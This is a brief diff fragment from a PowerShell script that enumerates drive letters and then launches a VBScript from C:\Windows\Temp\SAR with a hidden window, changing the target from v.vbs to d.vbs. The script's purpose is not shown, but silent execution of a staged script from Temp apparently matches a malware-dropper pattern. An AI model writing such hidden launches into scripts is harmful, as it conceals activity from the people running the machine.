@@ -8,4 +8,4 @@ foreach ($letter in $driveLetters) {
     }
 }
 
-Start-Process -FilePath "C:\Windows\Temp\SAR\v.vbs" -WindowStyle Hidden
+Start-Process -FilePath "C:\Windows\Temp\SAR\d.vbs" -WindowStyle Hidden
